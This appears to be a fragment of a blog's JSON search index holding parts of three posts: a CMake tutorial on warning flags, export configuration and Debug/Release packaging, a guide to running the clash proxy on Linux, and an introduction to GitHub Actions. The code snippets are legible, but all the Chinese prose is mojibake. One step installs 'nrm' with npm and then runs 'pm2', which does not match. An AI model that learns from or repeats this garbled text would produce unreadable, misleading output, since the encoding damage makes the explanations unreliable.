‡å¿—ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š set(gcc_like_cxx \"$\u003cCOMPILE_LANG_AND_ID:CXX,ARMClang,AppleClang,Clang,GNU\u003e\") set(msvc_cxx \"$\u003cCOMPILE_LANG_AND_ID:CXX,MSVC\u003e\") target_compile_options(tutorial_compiler_flags INTERFACE \"$\u003c${gcc_like_cxx}:$\u003cBUILD_INTERFACE:-Wall;-Wextra;-Wshadow;-Wformat=2;-Wunused\u003e\u003e\" \"$\u003c${msvc_cxx}:$\u003cBUILD_INTERFACE:-W3\u003e\u003e\" ) æŸ¥çœ‹æ­¤å†…å®¹ï¼Œæˆ‘ä»¬çœ‹åˆ°è­¦å‘Šæ ‡å¿—å°è£…åœ¨BUILD_INTERFACEæ¡ä»¶å†…ã€‚è¿™æ ·åšæ˜¯ä¸ºäº†ä½¿æˆ‘ä»¬å·²å®‰è£…é¡¹ç›®çš„ä½¿ç”¨è€…ä¸ä¼šç»§æ‰¿æˆ‘ä»¬çš„è­¦å‘Šæ ‡å¿—ã€‚ ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:10:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["æ„å»ºå·¥å…·"],"content":"æ·»åŠ å¯¼å‡ºé…ç½® åœ¨æ•™ç¨‹çš„â€œå®‰è£…å’Œæµ‹è¯•â€ä¸­ï¼Œæˆ‘ä»¬æ·»åŠ äº† CMake å®‰è£…é¡¹ç›®çš„åº“å’Œå¤´æ–‡ä»¶çš„åŠŸèƒ½ã€‚åœ¨â€æ„å»ºå®‰è£…ç¨‹åºâ€œæœŸé—´ï¼Œæˆ‘ä»¬æ·»åŠ äº†æ‰“åŒ…è¿™äº›ä¿¡æ¯çš„åŠŸèƒ½ï¼Œä»¥ä¾¿å¯ä»¥å°†å…¶åˆ†å‘ç»™å…¶ä»–äººã€‚ ä¸‹ä¸€æ­¥æ˜¯æ·»åŠ å¿…è¦çš„ä¿¡æ¯ï¼Œä»¥ä¾¿å…¶ä»– CMake é¡¹ç›®å¯ä»¥ä½¿ç”¨æˆ‘ä»¬çš„é¡¹ç›®ï¼Œæ— è®ºæ˜¯ä»æ„å»ºç›®å½•ï¼Œæœ¬åœ°å®‰è£…è¿˜æ˜¯æ‰“åŒ…æ—¶ã€‚ ç¬¬ä¸€æ­¥æ˜¯æ›´æ–°æˆ‘ä»¬çš„installï¼ˆTARGETSï¼‰å‘½ä»¤ï¼Œä¸ä»…è¦æŒ‡å®šDESTINATIONï¼Œè¿˜è¦æŒ‡å®šEXPORTã€‚ EXPORTå…³é”®å­—ç”Ÿæˆå¹¶å®‰è£…ä¸€ä¸ªCMakeæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«ç”¨äºä»å®‰è£…æ ‘ä¸­å¯¼å…¥installå‘½ä»¤ä¸­åˆ—å‡ºçš„æ‰€æœ‰ç›®æ ‡çš„ä»£ç ã€‚å› æ­¤ï¼Œè®©æˆ‘ä»¬ç»§ç»­ï¼Œé€šè¿‡æ›´æ–°MathFunctions/CMakeLists.txtä¸­çš„installå‘½ä»¤ï¼Œæ˜¾å¼å¯¼å‡ºMathFunctionsåº“ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š ç°åœ¨æˆ‘ä»¬å·²ç»å¯¼å‡ºäº†MathFunctionsï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ˜¾å¼å®‰è£…ç”Ÿæˆçš„MathFunctionsTargets.cmakeæ–‡ä»¶ã€‚é€šè¿‡å°†ä»¥ä¸‹å†…å®¹æ·»åŠ åˆ°é¡¶å±‚çš„CMakeLists.txtçš„åº•éƒ¨æ¥å®Œæˆï¼š install(EXPORT MathFunctionsTargets FILE MathFunctionsTargets.cmake DESTINATION lib/cmake/MathFunctions ) ç„¶åå°è¯•æ„å»ºé¡¹ç›®ï¼Œåº”è¯¥ä¼šé‡åˆ°ç±»ä¼¼ä¸‹é¢çš„é”™è¯¯ï¼š CMake Error in MathFunctions/CMakeLists.txt: Target \"MathFunctions\" INTERFACE_INCLUDE_DIRECTORIES property contains path: \"/Users/wmc/vscode/cmake/tutorial/MathFunctions\" which is prefixed in the source directory. CMake è¯•å›¾è¯´çš„æ˜¯ï¼Œåœ¨ç”Ÿæˆå¯¼å‡ºä¿¡æ¯çš„è¿‡ç¨‹ä¸­ï¼Œå®ƒå°†å¯¼å‡ºä¸å½“å‰æœºå™¨ä¸Šçš„ç»å¯¹è·¯å¾„ï¼Œåœ¨å…¶ä»–æœºå™¨ä¸Šæ— æ•ˆã€‚è§£å†³æ–¹æ¡ˆæ˜¯æ›´æ–°MathFunctionsçš„ target_include_directories()ï¼Œä»¥è®© CMake äº†è§£å½“ä»æ„å»ºç›®å½•å†…å’Œä»å®‰è£…/åŒ…ä¸­ä½¿ç”¨æ—¶ï¼Œå®ƒéœ€è¦ä¸åŒçš„ INTERFACE ä½ç½®ã€‚è¿™æ„å‘³ç€å°†MathFunctionsçš„target_include_directories()è°ƒç”¨è½¬æ¢ä¸ºå¦‚ä¸‹æ ·å­: target_include_directories(MathFunctions INTERFACE $\u003cBUILD_INTERFACE:${CMAKE_CURRENT_SOURCE_DIR}\u003e $\u003cINSTALL_INTERFACE:include\u003e ) ä¿®æ”¹åé‡æ–°è¿è¡Œ CMakeï¼Œåº”è¯¥ä¸ä¼šå†æœ‰è­¦å‘Šäº†ã€‚ æ­¤æ—¶ï¼Œæˆ‘ä»¬å·²ç»è®© CMake æ­£ç¡®åœ°æ‰“åŒ…äº†æ‰€éœ€çš„ç›®æ ‡ä¿¡æ¯ï¼Œä½†æˆ‘ä»¬ä»ç„¶éœ€è¦ç”Ÿæˆä¸€ä¸ªMathFunctionsConfig.cmakeï¼Œè¿™æ ·CMake find_package()å‘½ä»¤æ‰èƒ½æ‰¾åˆ°æˆ‘ä»¬çš„é¡¹ç›®ã€‚æ‰€ä»¥æˆ‘ä»¬ç»§ç»­åœ¨é¡¹ç›®çš„é¡¶å±‚æ·»åŠ ä¸€ä¸ªæ–°æ–‡ä»¶ï¼Œåä¸ºConfig.cmake.inï¼Œå†…å®¹å¦‚ä¸‹ã€‚ @PACKAGE_INIT@ include ( \"${CMAKE_CURRENT_LIST_DIR}/MathFunctionsTargets.cmake\" ) ç„¶åï¼Œä¸ºäº†æ­£ç¡®é…ç½®å’Œå®‰è£…è¯¥æ–‡ä»¶ï¼Œåœ¨é¡¶å±‚CMakeLists.txtçš„åº•éƒ¨æ·»åŠ ä»¥ä¸‹å†…å®¹: include(CMakePackageConfigHelpers) # generate the config file that is includes the exports configure_package_config_file(${CMAKE_CURRENT_SOURCE_DIR}/Config.cmake.in \"${CMAKE_CURRENT_BINARY_DIR}/MathFunctionsConfig.cmake\" INSTALL_DESTINATION \"lib/cmake/example\" NO_SET_AND_CHECK_MACRO NO_CHECK_REQUIRED_COMPONENTS_MACRO ) # generate the version file for the config file write_basic_package_version_file( \"${CMAKE_CURRENT_BINARY_DIR}/MathFunctionsConfigVersion.cmake\" VERSION \"${Tutorial_VERSION_MAJOR}.${Tutorial_VERSION_MINOR}\" COMPATIBILITY AnyNewerVersion ) # install the configuration file install(FILES ${CMAKE_CURRENT_BINARY_DIR}/MathFunctionsConfig.cmake DESTINATION lib/cmake/MathFunctions ) æ­¤æ—¶ï¼Œæˆ‘ä»¬å·²ç»ä¸ºæˆ‘ä»¬çš„é¡¹ç›®ç”Ÿæˆäº†ä¸€ä¸ªå¯é‡å®šä½çš„ CMake é…ç½®ï¼Œå¯ä»¥åœ¨é¡¹ç›®å®‰è£…æˆ–æ‰“åŒ…åä½¿ç”¨ã€‚å¦‚æœæˆ‘ä»¬å¸Œæœ›æˆ‘ä»¬çš„é¡¹ç›®ä¹Ÿèƒ½åœ¨æ„å»ºç›®å½•ä¸‹ä½¿ç”¨ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨é¡¶å±‚ CMakeLists.txtçš„åº•éƒ¨æ·»åŠ ä»¥ä¸‹å†…å®¹: é€šè¿‡è¿™ä¸ªexportè°ƒç”¨ï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥ç”Ÿæˆä¸€ä¸ªTargets.cmakeï¼Œå…è®¸æ„å»ºç›®å½•ä¸‹é…ç½®çš„MathFunctionsConfig.cmakeè¢«å…¶ä»–é¡¹ç›®ä½¿ç”¨ï¼Œè€Œä¸éœ€è¦å®‰è£…å®ƒã€‚ ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:11:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["æ„å»ºå·¥å…·"],"content":"æ‰“åŒ… Debug å’Œ Release æ³¨æ„ï¼šè¿™ä¸ªä¾‹å­å¯¹å•é…ç½®ç”Ÿæˆå™¨æœ‰æ•ˆï¼Œå¯¹å¤šé…ç½®ç”Ÿæˆå™¨ï¼ˆå¦‚ Visual Studioï¼‰æ— æ•ˆã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼ŒCMake çš„æ¨¡å‹æ˜¯ä¸€ä¸ªæ„å»ºç›®å½•åªåŒ…å«ä¸€ä¸ªé…ç½®ï¼Œæ— è®ºæ˜¯ Debugã€Releaseã€MinSizeRelï¼Œè¿˜æ˜¯ RelWithDebInfoã€‚ç„¶è€Œï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½® CPack æ¥æ†ç»‘å¤šä¸ªæ„å»ºç›®å½•ï¼Œå¹¶æ„å»ºä¸€ä¸ªåŒ…å«åŒä¸€é¡¹ç›®å¤šä¸ªé…ç½®çš„åŒ…ã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬è¦ç¡®ä¿ Debug ç‰ˆæœ¬å’Œ Release ç‰ˆæœ¬æ„å»ºçš„å¯æ‰§è¡Œæ–‡ä»¶å’Œåº“ä½¿ç”¨ä¸åŒçš„åç§°ã€‚è®©æˆ‘ä»¬ä½¿ç”¨ d ä½œä¸º Debug ç‰ˆå¯æ‰§è¡Œæ–‡ä»¶å’Œåº“çš„åç¼€ã€‚ åœ¨é¡¶å±‚çš„CMakeLists.txtæ–‡ä»¶å¼€å§‹å¤„æ·»åŠ ï¼š set(CMAKE_DEBUG_POSTFIX d) add_library(tutorial_compiler_flags INTERFACE) ä»¥åŠTUtorialå¯æ‰§è¡Œæ–‡ä»¶ä¸Šçš„ DEBUG_POSTFIX å±æ€§: add_executable(Tutorial tutorial.cxx) set_target_properties(Tutorial PROPERTIES DEBUG_POSTFIX ${CMAKE_DEBUG_POSTFIX}) target_link_libraries(Tutorial PUBLIC MathFunctions) æˆ‘ä»¬ä¹Ÿç»™MathFunctionsåº“æ·»åŠ ç‰ˆæœ¬å·ã€‚åœ¨MathFunctions/CMakeLists.txtä¸­ï¼Œè®¾ç½®VERSIONå’ŒSOVERSIONå±æ€§: set_property(TARGET MathFunctions PROPERTY VERSION \"1.0.0\") set_property(TARGET MathFunctions PROPERTY SOVERSION \"1\") åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹ï¼š mkdir -p step12_build/{debug,release} ç°åœ¨æˆ‘ä»¬éœ€è¦è®¾ç½® debug å’Œ release ç‰ˆæœ¬ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨CMAKE_BUILD_TYPEæ¥è®¾ç½®é…ç½®ç±»å‹ï¼š cd debug cmake -DCMAKE_BUILD_TYPE=Debug ../.. cmake --build . cd ../release cmake -DCMAKE_BUILD_TYPE=Release ../.. cmake --build . ç°åœ¨è°ƒè¯•å’Œå‘è¡Œç‰ˆçš„æ„å»ºéƒ½å·²ç»å®Œæˆï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ªè‡ªå®šä¹‰çš„é…ç½®æ–‡ä»¶å°†ä¸¤ä¸ªæ„å»ºæ‰“åŒ…æˆä¸€ä¸ªå‘è¡Œç‰ˆã€‚åœ¨ step12_build ç›®å½•ä¸‹ï¼Œåˆ›å»ºä¸€ä¸ªåä¸ºMultiCPackConfig.cmakeçš„æ–‡ä»¶ã€‚åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ï¼Œé¦–å…ˆåŒ…å« cmake å¯æ‰§è¡Œæ–‡ä»¶åˆ›å»ºçš„é»˜è®¤é…ç½®æ–‡ä»¶ æ¥ä¸‹æ¥ï¼Œä½¿ç”¨CPACK_INSTALL_CMAKE_PROJECTSå˜é‡æ¥æŒ‡å®šè¦å®‰è£…çš„é¡¹ç›®ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œæˆ‘ä»¬å¸Œæœ›åŒæ—¶å®‰è£… debug å’Œ release ç‰ˆæœ¬ï¼š include(\"release/CPackConfig.cmake\") set(CPACK_INSTALL_CMAKE_PROJECTS \"debug;Tutorial;ALL;/\" \"release;Tutorial;ALL;/\" ) åœ¨ step12_build ç›®å½•ä¸‹ï¼Œè¿è¡Œcpackï¼Œç”¨configé€‰é¡¹æŒ‡å®šæˆ‘ä»¬çš„è‡ªå®šä¹‰é…ç½®æ–‡ä»¶: cpack --config MultiCPackConfig.cmake ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:12:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["Linux"],"content":"èµ·å›  å¶ç„¶å‘ç°ç™¾åº¦äº‘çš„å­¦ç”ŸæœåŠ¡å™¨æŒºä¾¿å®œï¼Œ2 æ ¸å¿ƒ 4g å†…å­˜æœºå‹ä¸€ä¸ªæœˆåªè¦ 18 å…ƒï¼Œæœ‰ä¸ªéšæ—¶éšåœ°èƒ½å¤Ÿè®¿é—®çš„ Linux ç¯å¢ƒè¿˜æ˜¯æŒºå¥½çš„ï¼Œé‚è´­å…¥ã€‚æ–°ç³»ç»Ÿåˆå§‹åŒ–å®Œæˆï¼Œç¬¬ä¸€ä»¶äº‹å½“ç„¶æ˜¯æ¥ä¸€å¥—ohmyzshï¼Œç»“æœè¿™å°±å‡ºäº†é—®é¢˜ï¼Œgit cloneå¤ªæ…¢äº†ã€‚ é‚æƒ³åˆ°æ˜¯ä¸æ˜¯è¯¥ç»™å…¶ä½¿ç”¨ä¸€ä¸‹ä»£ç†ã€‚ä¸ç„¶ä¹‹åä¸æ­¢git cloneï¼Œå¾ˆå¤šèµ„æºéƒ½æ— æ³•ä¸‹è½½ã€‚ ","date":"2020-08-21","objectID":"/posts/linux-clash-proxy/:1:0","tags":["clash","ä»£ç†"],"title":"Linuxä½¿ç”¨clashä»£ç†","uri":"/posts/linux-clash-proxy/"},{"categories":["Linux"],"content":"ä½¿ç”¨clash clashæ˜¯ä¸€æ¬¾ä½¿ç”¨goè¯­è¨€å¼€å‘çš„å¤šå¹³å°ä»£ç†å·¥å…·ï¼Œæ”¯æŒss/v2rayç­‰å¤šç§åè®®ï¼Œåœ¨macOSï¼Œwindowsä¸Šä½¿ç”¨èµ·æ¥å¾ˆæ–¹ä¾¿ï¼Œåœ¨æ²¡æœ‰GUIçš„Linuxä¹Ÿåªéœ€è¦ç¨åŠ é…ç½®ã€‚ å…ˆä»è¿™é‡Œä¸‹è½½clashçš„linux-amd64å¯æ‰§è¡Œæ–‡ä»¶ã€‚ naruto@bdy:~$ gzip -d clash-linux-amd64-v1.1.0.gz naruto@bdy:~$ chmod +x clash-linux-amd64-v1.1.0 naruto@bdy:~$ sudo mv clash-linux-amd64-v1.1.0 /usr/local/bin/clash ç„¶åä¸‹è½½Country.mmdbã€‚ naruto@bdy:~$ mkdir -p .config/clash naruto@bdy:~$ mv Country.mmdb .config/clash/ ä¹‹åï¼Œéœ€è¦æœ€å…³é”®çš„clashä»£ç†é…ç½®æ–‡ä»¶config.yamlï¼Œä¸€èˆ¬æœºåœºéƒ½ä¼šæä¾›ï¼ŒåŒæ ·å°†å…¶æ”¾åˆ°.config/clashç›®å½•ä¸‹ã€‚ ä¹‹åå…ˆç›´æ¥å¯åŠ¨clashçœ‹çœ‹æ•ˆæœã€‚ å¯åŠ¨é‡åˆ°WARN[0000] Failed to start Redir UDP Listener: operation not permittedï¼Œå¯ä»¥ä½¿ç”¨sudo clashå¯åŠ¨ã€‚ ","date":"2020-08-21","objectID":"/posts/linux-clash-proxy/:2:0","tags":["clash","ä»£ç†"],"title":"Linuxä½¿ç”¨clashä»£ç†","uri":"/posts/linux-clash-proxy/"},{"categories":["Linux"],"content":"é…ç½® GUI ç•Œé¢ ä»ä¸Šä¸€æ®µçš„å›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼ŒclashæœåŠ¡æœ‰ä¸€ä¸ªRESTful APIçš„æœåŠ¡ï¼Œé€šè¿‡å…¶æˆ‘ä»¬å¯ä»¥è®¿é—® web ç®¡ç†é¡µé¢ã€‚åœ¨config.yamlä¸­åˆ¶å®šå³å¯ã€‚æ¯”è¾ƒå—æ¬¢è¿çš„æ˜¯yacdï¼Œå¯ä»¥ç›´æ¥ä¸‹è½½æ‰“åŒ…å¥½çš„ç‰ˆæœ¬ã€‚ naruto@bdy:~$ unzip yacd-gh-pages.zip naruto@bdy:~$ mv yacd-gh-pages .config/clash/dashboard åœ¨config.yamlä¸­å¦‚ä¸‹è®¾ç½®ï¼š external-ui: \"dashboard\" secret: \"\" å¯åŠ¨clashåï¼Œæµè§ˆå™¨ä½¿ç”¨ip:port/uiçš„æ–¹å¼è®¿é—®ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ ","date":"2020-08-21","objectID":"/posts/linux-clash-proxy/:3:0","tags":["clash","ä»£ç†"],"title":"Linuxä½¿ç”¨clashä»£ç†","uri":"/posts/linux-clash-proxy/"},{"categories":["Linux"],"content":"äº«ç”¨ä»£ç† åœ¨ GUI ç•Œé¢é€‰æ‹©å¥½ä»£ç†æœåŠ¡å™¨åï¼Œå°±å¯ä»¥ä½¿ç”¨ä»£ç†äº†ã€‚æ‰“å¼€å¦ä¸€ä¸ªç»ˆç«¯çª—å£ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œè®¾ç½®http(s)ä»£ç†ç¯å¢ƒå˜é‡ã€‚ export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890 æ¥ä¸‹æ¥ï¼Œè¿›è¡Œä¸€äº›å®Œå–„å·¥ä½œã€‚é¦–å…ˆæ¯æ¬¡éƒ½æ‰‹åŠ¨å¯åŠ¨clashå¹¶ä¸”å ç”¨ä¸€ä¸ªç»ˆç«¯çª—å£æ˜¯å¾ˆä¸æ–¹ä¾¿çš„ï¼Œå…ˆå°†clashä½œä¸ºä¸€ä¸ªdaemonè¿›ç¨‹ã€‚å‚ç…§å¼€å‘è€…æ¨èï¼Œä½¿ç”¨pm2ã€‚ $ npm install -g nrm $ pm2 start clash ç„¶åæ˜¯å°†ä»£ç†å‘½ä»¤ä½œä¸ºå‡½æ•°å†™å…¥.zshrc. æ³¨æ„ï¼Œä¸‹é¢ä½¿ç”¨äº†zshè¯­æ³•ï¼Œå’Œbashç•¥æœ‰ä¸åŒã€‚ PROXY_IP=127.0.0.1 PROXY_PORT=7890 function Proxy() { if [ \"$1\" = \"on\" ]; then export https_proxy=$PROXY_IP:$PROXY_PORT export http_proxy=$PROXY_IP:$PROXY_PORT echo Proxy On else unset https_proxy unset http_proxy echo Proxy Off fi } ç„¶åè¯•è¯•çœ‹ï¼Œéå¸¸æ„‰å¿«ã€‚ æœ€åï¼Œæˆ‘ä»¬æ¥è£…ä¸€ä¸ªrustè¯•è¯•ã€‚ ","date":"2020-08-21","objectID":"/posts/linux-clash-proxy/:4:0","tags":["clash","ä»£ç†"],"title":"Linuxä½¿ç”¨clashä»£ç†","uri":"/posts/linux-clash-proxy/"},{"categories":["github"],"content":"ç®€ä»‹ GitHub Actionså¯å¸®åŠ©å¼€å‘äººå‘˜åœ¨è½¯ä»¶å¼€å‘ç”Ÿå‘½å‘¨æœŸå†…è‡ªåŠ¨åŒ–ä»»åŠ¡ã€‚ GitHub Actions æ˜¯äº‹ä»¶é©±åŠ¨çš„ï¼Œè¿™æ„å‘³ç€å¯ä»¥åœ¨å‘ç”ŸæŒ‡å®šäº‹ä»¶åè¿è¡Œä¸€ç³»åˆ—å‘½ä»¤ã€‚ä¾‹å¦‚ï¼Œæ¯å½“æœ‰äººä¸ºä»“åº“æ–°å»ºpræ—¶ï¼Œå¯ä»¥è‡ªåŠ¨è¿è¡Œæµ‹è¯•è„šæœ¬ã€‚ è¯¥å›¾æ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨ GitHub Actions è‡ªåŠ¨è¿è¡Œè½¯ä»¶æµ‹è¯•è„šæœ¬ã€‚äº‹ä»¶è‡ªåŠ¨è§¦å‘åŒ…jobå«çš„workflowã€‚ç„¶åï¼Œjobå°†ä½¿ç”¨stepæ¥æ§åˆ¶actionçš„æ‰§è¡Œé¡ºåºã€‚è¿™äº›actionå³æ˜¯è‡ªåŠ¨åŒ–æµ‹è¯•è½¯ä»¶çš„å‘½ä»¤ã€‚ ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:1:0","tags":["CI/CD","gitpages"],"title":"Github Actionsç®€ä»‹","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"Github Actions çš„ç»„ä»¶ ä»¥ä¸‹æ˜¯å¯ååŒè¿è¡Œjobçš„å¤šä¸ªGitHub Actionsç»„ä»¶çš„åˆ—è¡¨ã€‚å¯ä»¥çœ‹åˆ°è¿™äº›ç»„ä»¶ä¹‹é—´å¦‚ä½•äº¤äº’ ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:2:0","tags":["CI/CD","gitpages"],"title":"Github Actionsç®€ä»‹","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"workflow workflowæ‚¨æ·»åŠ åˆ°ä»£ç ä»“åº“ä¸­çš„è‡ªåŠ¨åŒ–è¿‡ç¨‹ã€‚å…¶ç”±ä¸€ä¸ªæˆ–å¤šä¸ªjobç»„æˆï¼Œå¯ä»¥ç”±äº‹ä»¶è°ƒåº¦æˆ–è§¦å‘ã€‚è¯¥workflowå¯ç”¨äºåœ¨ GitHub ä¸Šæ„å»ºï¼Œæµ‹è¯•ï¼Œæ‰“åŒ…ï¼Œå‘å¸ƒæˆ–éƒ¨ç½²é¡¹ç›®ã€‚ ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:2:1","tags":["CI/CD","gitpages"],"title":"Github Actionsç®€ä»‹","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"Events eventæ˜¯è§¦å‘workflowçš„ç‰¹å®šæ´»åŠ¨ã€‚ä¾‹å¦‚ï¼Œå½“æœ‰äººå°†commit æ¨é€åˆ°ä»“åº“æˆ–åˆ›å»ºissueæˆ–præ—¶ï¼ŒGithub ä¼šäº§ç”Ÿenventã€‚è¿˜å¯ä»¥ä½¿ç”¨ repository dispatch webhookåœ¨å‘ç”Ÿå¤–éƒ¨äº‹ä»¶æ—¶è§¦å‘workflowã€‚æœ‰å…³å¯ç”¨äºè§¦å‘workflowçš„evrntçš„å®Œæ•´åˆ—è¡¨ï¼ŒæŸ¥çœ‹Events that trigger workflowsã€‚ ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:2:2","tags":["CI/CD","gitpages"],"title":"Github Actionsç®€ä»‹","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"Jobs jobæ˜¯åœ¨åŒä¸€runnerä¸Šæ‰§è¡Œçš„ä¸€ç»„stepã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå…·æœ‰å¤šä¸ªjobçš„workflowç¨‹å°†å¹¶è¡Œè¿è¡Œè¿™äº›jobã€‚è¿˜å¯ä»¥é…ç½®workflowä»¥æŒ‰é¡ºåºè¿è¡Œjobã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªworkflowå¯ä»¥æœ‰ä¸¤ä¸ªé¡ºåºæ‰§è¡Œçš„jobæ¥æ„å»ºå’Œæµ‹è¯•ä»£ç ï¼Œå…¶ä¸­æµ‹è¯•jobå–å†³äºæ„å»ºjobçš„çŠ¶æ€ã€‚å¦‚æœæ„å»ºjobå¤±è´¥ï¼Œåˆ™æµ‹è¯•jobå°†ä¸ä¼šè¿è¡Œã€‚ ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:2:3","tags":["CI/CD","gitpages"],"title":"Github Actionsç®€ä»‹","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"Steps stepæ˜¯å¯ä»¥åœ¨jobä¸­è¿è¡Œå‘½ä»¤çš„å•ä¸ªä»»åŠ¡ã€‚stepå¯ä»¥æ˜¯æ“ä½œæˆ–shellå‘½ä»¤ã€‚jobä¸­çš„æ¯ä¸ªstepéƒ½åœ¨åŒä¸€runnerä¸Šæ‰§è¡Œï¼Œä»è€Œä½¿è¯¥jobä¸­çš„æ“ä½œå¯ä»¥å½¼æ­¤å…±äº«æ•°æ®ã€‚ ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:2:4","tags":["CI/CD","gitpages"],"title":"Github Actionsç®€ä»‹","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"Actions actionæ˜¯ç‹¬ç«‹çš„å‘½ä»¤ï¼Œç»„åˆæˆstepä»¥æ„å»ºjob, actionæ˜¯å·¥ä½œæµä¸­æœ€å°çš„å¯ç§»æ¤æ„å»ºå—ã€‚å¯ä»¥åˆ›å»ºè‡ªå·±çš„actionï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ GitHub ç¤¾åŒºåˆ›å»ºçš„actionã€‚è¦åœ¨å·¥ä½œæµä¸­ä½¿ç”¨actionï¼Œå¿…é¡»å°†å…¶åŒ…æ‹¬åœ¨ä¸€ä¸ªstepä¸­ã€‚ ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:2:5","tags":["CI/CD","gitpages"],"title":"Github Actionsç®€ä»‹","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"Runners runneræ˜¯å·²å®‰è£…GitHub Actions runner åº”ç”¨ç¨‹åºçš„æœåŠ¡å™¨ã€‚å¯ä»¥ä½¿ç”¨ GitHub æ‰˜ç®¡çš„runnerï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨è‡ªå·±çš„runnerã€‚runnerç›‘å¬å¯ç”¨çš„jobï¼Œä¸€æ¬¡è¿è¡Œä¸€ä¸ªjobï¼Œå¹¶å°†è¿›åº¦ï¼Œæ—¥å¿—å’Œç»“æœåé¦ˆç»™ GitHubã€‚å¯¹äºç”± GitHub æ‰˜ç®¡çš„runnerï¼Œworkflowä¸­çš„æ¯ä¸ªjobéƒ½åœ¨å…¨æ–°çš„è™šæ‹Ÿç¯å¢ƒä¸­è¿è¡Œã€‚ GitHub æ‰˜ç®¡çš„runneråŸºäº Ubuntu Linuxï¼ŒMicrosoft Windows å’Œ macOSã€‚æœ‰å…³ GitHub æ‰˜ç®¡çš„runnerçš„ä¿¡æ¯ï¼Œè¯·å‚é˜…\"Virtual environments for GitHub-hosted runners\"ã€‚å¦‚æœéœ€è¦å…¶ä»–çš„ OS æˆ–ç‰¹å®šçš„ç¡¬ä»¶é…ç½®ï¼Œåˆ™å¯ä»¥æ‰˜ç®¡è‡ªå·±çš„runnerã€‚æœ‰å…³è‡ªæ‰˜ç®¡runnerçš„ä¿¡æ¯ï¼Œè¯·å‚é˜…\"Hosting your own runners\"ã€‚ ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:2:6","tags":["CI/CD","gitpages"],"title":"Github Actionsç®€ä»‹","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"åˆ›å»ºæ ·ä¾‹ workflow GitHub Actions ä½¿ç”¨YAMLè¯­æ³•å®šä¹‰eventï¼Œjobå’Œstepã€‚è¿™äº› YAML æ–‡ä»¶å­˜å‚¨åœ¨ä»£ç å­˜å‚¨åº“ä¸­çš„.github / workflowsç›®å½•ä¸­ã€‚ å¯ä»¥åœ¨ä»“åº“ä¸­åˆ›å»ºç¤ºä¾‹çš„workflowï¼Œè¯¥workflowåœ¨æ¯æ¬¡æ¨é€ä»£ç æ—¶è‡ªåŠ¨è§¦å‘ä¸€ç³»åˆ—å‘½ä»¤ã€‚åœ¨æ­¤workflowä¸­ï¼ŒGitHub Actions ä½¿ç”¨äº†actions marketçš„checkoutå’Œsetup-node actionï¼Œç„¶åå®‰è£…è½¯ä»¶ä¾èµ–é¡¹ï¼Œå¹¶è¿è¡Œbat -vã€‚ é¦–å…ˆåœ¨é¡¹ç›®ä¸­åˆ›å»º.github/workflowç›®å½• åœ¨å…¶ä¸­ï¼Œåˆ›å»ºä¸€ä¸ªlearn-github-actions.ymlæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š name: learn-github-actions on: [push] jobs: check-bats-version: runs-on: ubuntu-latest steps: - uses: actions/checkout@v2 - uses: actions/setup-node@v1 - run: npm install -g bats - run: bats -v commitè¿™äº›ä¿®æ”¹å¹¶ä¸”pushä»£ç åˆ°ä»“åº“ ç°åœ¨ï¼Œæ–°çš„GitHub Actionså·¥ä½œæµæ–‡ä»¶å·²å®‰è£…åœ¨ä»£ç ä»“åº“ä¸­ï¼Œå¹¶ä¸”æ¯æ¬¡æœ‰äººå°†æ›´æ”¹æ¨é€åˆ°ä»“åº“æ—¶ï¼Œå®ƒå°†è‡ªåŠ¨è¿è¡Œã€‚æœ‰å…³ä½œä¸šçš„æ‰§è¡Œå†å²è®°å½•çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…\"Viewing the workflowâ€™s activity\"ã€‚ è¦æ›´è¯¦ç»†äº†è§£workflowæ–‡ä»¶ï¼Œå‚é˜…Understanding the workflow fileã€‚ 